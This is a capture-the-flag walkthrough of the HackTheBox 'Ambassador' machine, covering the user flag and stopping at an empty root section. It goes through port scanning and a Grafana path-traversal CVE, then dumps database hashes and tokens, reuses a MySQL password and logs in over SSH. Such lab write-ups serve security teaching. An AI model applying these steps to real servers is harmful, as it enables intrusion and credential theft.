# Machine: Ambassador (HackTheBox)
- Difficulty: Medium
- Link: https://app.hackthebox.com/machines/Ambassador

## User Flag
### Initial Recon
1. Step one, run an nmap:
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan 10.10.11.183
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 16:48 EDT
Nmap scan report for 10.10.11.183
Host is up (0.072s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 04 Nov 2022 20:49:51 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 04 Nov 2022 20:49:20 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 04 Nov 2022 20:49:25 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 34
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, LongColumnFlag, FoundRows, Speaks41ProtocolOld, InteractiveClient, SupportsTransactions, LongPassword, Speaks41ProtocolNew, IgnoreSigpipes, SwitchToSSLAfterHandshake, ODBCClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x01 6\x1AsZ\x1A\x14@FB+|pL\x04CAw%
|_  Auth Plugin Name: caching_sha2_password

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.81 seconds
```


2. See a HTTP service on port 80 & 3000, lets check it out. 

![image](https://user-images.githubusercontent.com/106893251/200103783-20741806-2ccb-42e2-b3b9-08717e5cbc59.png)
Website is boring and there is nothing of interest other than the mention of a 'development' account with SSH access.

Checking out Port 3000 is much more interesting:
![image](https://user-images.githubusercontent.com/106893251/200102354-3e17f99b-5b31-4993-b634-e63a742fad4c.png)



3. Appears the service is Grafana v8.2.0, lets check Google and see if there are any known issues.

![image](https://user-images.githubusercontent.com/106893251/200102404-b6a53d1c-afc2-4363-8de7-76d9f63e6cb6.png)
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798

Appears there is a known directory path traversal vulnerability. This should be able to get us started.

4. Found a POC exploit on GitHub @ https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
![image](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/raw/main/demo.gif)
This POC should make things a little easier as we can preload the paths.txt file with the location of all the files we want to search for with sensitive data.


5. Exploit was successful and returned the grafana settings and database. Nothing else was of interest.
6. Database is a SQLite3 database so we open it up using sqlite3.  
```
┌──(kali㉿kali)-[~/hackthebox/ambassador/exploit-grafana-CVE-2021-43798/http_ambassador_htb_3000]
└─$ sqlite3                    
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open grafana.db
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-11-04 22:50:20|0
2|0|Test|Test|Test|9543370336d9d69e08d10977607f029e40d39ff446a915c2779297943487e71765ba66f7e4b869f9944801465a05b969f87f|a2F7jIRGh5|AKSw3hobxw||1|0|0||2022-11-04 13:48:06|2022-11-04 13:48:06|0|2012-11-04 13:48:06|0
```
Admin password is hashed, so lets keep looking before thinking about cracking it.

```
sqlite> select * from preferences;
sqlite> select * from user_auth;
sqlite> select * from kv_store;
sqlite> select * from api_key;
1|1|test|3bf485df8b575b48b9cbfc9dbdcb9e59b3902e52c0003ac5bf70c25f424eccb8e584f14bd21f3ac8ab6fcc5b86209faa1db0|Admin|2022-11-04 13:32:06|2022-11-04 13:32:06|
sqlite> select * from user_auth_token;
5|1|35328c03240e92e57a442a0e66975aa735cdc0f3abefb8d7c1dd4c8abc8c98b7|4cd8861dab3cd66085d7924cb5f74f227335894c18c722220e0f55f6987972b4|Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0|10.10.16.6|1|1667569638|1667569622|1667567400|1667567400|0
6|1|5888345e16d9e9b12be11edcb9cf7c3827e7aa67ec123b48cb935b81a601e8ef|fc1caacf888b24d3add1dd886b0896a62e586a41e1cb80c49d0768406cc94860|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36|10.10.14.80|1|1667591121|1667591121|1667583609|1667583609|0
7|1|b84a06afb083cd6b7f92955f632ae20c92ee47cf5feb00bd682cf6ae3282ad6a|6672100f840fda6d76032340c0fdeb5796f492253677aa26bcb21c1a2785e6c9|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36|10.10.14.120|0|0|1667601583|1667595985|1667595985|0
8|1|368066261cf33abc8747ec5f85b8661148d25e76a022095878985194a9d20ebd|368066261cf33abc8747ec5f85b8661148d25e76a022095878985194a9d20ebd|Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0|10.10.14.147|1|1667597915|1667597915|1667597915|1667597915|0
9|1|33a99e879ebc5a8c12b8a324689de2c59901d873a9372443fd069297a057081d|d55f690667bd8a4c5551e72494d8e53c1aaba9a098ad4b27f79ce0239ea31c18|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36|10.10.14.142|1|1667600916|1667600916|1667599570|1667599570|0
10|1|aabe0ff7694e6882c91be9dd32778ca976d1febd22f018eb7fc761986899e73e|196cadacd54feff1054ffd23b070690f06de85ce5a4c3e7b777bb55529c153c4|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36|10.10.14.120|1|1667601865|1667601865|1667599638|1667599638|0
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSo******Me*****!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-04 05:19:06|0|{}|1|uKewFgM4z
3|1|5|mysql|MySQL|proxy|||root|schemata|0|||0|{}|2022-11-04 22:08:10|2022-11-04 22:19:47|0|{}|0|7bWNZ7DVz
4|1|1|loki|Loki|proxy|||||0|||0|{}|2022-11-04 22:37:18|2022-11-04 22:37:18|0|{}|0|LQ2CM7DVz
```
Looks like there is a MySQL password in the data_source table. The initial nmap scan showed an accessable mysql instance.

7. Connecting to MySQL instance:
```
┌──(kali㉿kali)-[~]
└─$ mysql -u grafana -p -h ambassador.htb grafana
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [grafana]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.075 sec)

MySQL [grafana]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.073 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTW******ZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.074 sec)
```
Looks like we have a Base64 encoded password for the `developer` user. Lets try it via SSH

8. Logging in Via SSH:
```
┌──(kali㉿kali)-[~/hackthebox/ambassador/exploit-grafana-CVE-2021-43798/http_ambassador_htb_3000]
└─$ ssh developer@ambassador.htb                      
developer@ambassador.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 05 Nov 2022 05:37:47 AM UTC

  System load:           0.0
  Usage of /:            81.0% of 5.07GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             236
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:a218


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Nov  5 03:52:02 2022 from 10.10.14.45
developer@ambassador:~$ ls -lha
total 52K
drwxr-xr-x 7 developer developer 4.0K Nov  5 04:09 .
drwxr-xr-x 3 root      root      4.0K Mar 13  2022 ..
lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3.8K Mar 14  2022 .bashrc
drwx------ 3 developer developer 4.0K Mar 13  2022 .cache
-rw-rw-r-- 1 developer developer  788 Nov  5 04:09 exploit.py
-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
drwx------ 3 developer developer 4.0K Nov  5 02:41 .gnupg
drwxrwxr-x 3 developer developer 4.0K Mar 13  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 3 developer developer 4.0K Mar 14  2022 snap
drwx------ 2 developer developer 4.0K Mar 13  2022 .ssh
-rw-r----- 1 root      developer   33 Nov  4 23:17 user.txt
developer@ambassador:~$ cat user.txt
143904fca24ea******a943610c4c588
```
User Flag has been found!

## Root Flag

